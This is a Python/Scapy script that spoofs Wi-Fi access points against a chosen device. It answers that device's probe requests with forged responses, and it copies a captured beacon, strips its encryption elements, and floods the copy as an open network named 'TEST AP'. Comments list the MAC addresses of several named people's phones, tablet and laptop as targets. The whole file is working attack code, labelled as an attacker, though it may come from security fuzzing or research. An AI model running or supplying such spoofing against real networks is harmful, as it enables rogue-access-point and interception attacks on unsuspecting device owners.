from datetime import datetime
from scapy.all import *
import random
import time
import sys

monitor = "wlan0"
injector = "wlan0"
target = "6C:C7:EC:BA:E9:22" # Shaked's phone
#target = "8C:83:E1:F4:16:EC" # Shaked's tablet
#target = "DC:0C:5C:B0:D7:36" # Ella's phone
#target = "44:85:00:1C:3A:0E" # Ella's laptop
source = "00:0c:29:52:66:4e"
		
def removeEltLayer(pkt, ID):
	layer = pkt.getlayer(Dot11Elt)
	while layer:
		if(layer.ID == ID):
			afterLayer = layer.payload
			layer.underlayer.remove_payload()
			pkt = pkt / afterLayer
			break
		layer = layer.payload.getlayer(Dot11Elt)
	return pkt

def fuzzProbeResponse(pkt):
	name = 'TEST AP'
	length = 7
	pkt = removeEltLayer(pkt, 0)
	pkt = pkt / Dot11Elt(ID = 0, len = length, info = name)
	return pkt
		

def craftProbeResponse(pkt):
	afterRequestLayer = pkt.getlayer(Dot11ProbeReq).payload
	pkt.getlayer(Dot11ProbeReq).underlayer.remove_payload()
	pkt = pkt / Dot11ProbeResp(cap = 0x1100) / afterRequestLayer
	pkt.getlayer(Dot11).subtype = 5 # change subtype to 5 means the packet is of type probe response
	
	clientAddress = pkt.getlayer(Dot11).addr2
	apAddress = pkt.getlayer(Dot11).addr1
	pkt.getlayer(Dot11).addr1, pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = clientAddress, source, source
	return pkt
	
def handleProbeResponse(pkt):
	if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11EltDSSSet) and pkt.haslayer(Dot11EltRates, 2):
		if(pkt.getlayer(Dot11).addr2.lower() != target.lower()):
			return
		print('got probe request from the target, crafting a probe response.')
		resp = craftProbeResponse(pkt) 
		for i in range(1):
			resp = fuzzProbeResponse(resp)
			sendp(resp, iface = injector, verbose = False)
			
def probeAttack():
	sniff(iface = monitor, prn = handleProbeResponse)
	while 1:
		time.sleep(1)

def fuzzBeacon(pkt):
	name = 'TEST AP'
	length = 7
	pkt = removeEltLayer(pkt, 0)
	
	layer = pkt.getlayer(Dot11EltMicrosoftWPA)
	afterLayer = layer.payload
	layer.underlayer.remove_payload()
	pkt = pkt / afterLayer
	
	layer = pkt.getlayer(Dot11EltRSN)
	afterLayer = layer.payload
	layer.underlayer.remove_payload()
	pkt = pkt / afterLayer
	
	pkt.getlayer(Dot11Beacon).cap = 0x0100
	pkt = pkt / Dot11Elt(ID = 0, len = length, info = name)
	pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = source, source 
	return pkt

beacon = None
def beaconAttack():
	global beacon
	def stopFilter(pkt):
		global beacon
		if(pkt.haslayer(Dot11Beacon)):
			print("Sniffed a beacon frame")
			beacon = pkt
			return True
		return False
		
	sniff(iface = monitor, stop_filter = stopFilter)
	while(beacon == None):
		time.sleep(0.1)
	beacon = fuzzBeacon(beacon)
	while 1:
		sendp(beacon, iface = injector, verbose = False)
		
if __name__ == '__main__':
	print('\n' + 'Attacker Initialized')
	print('Attacking the target: ' + target + '\n')
	beaconAttack()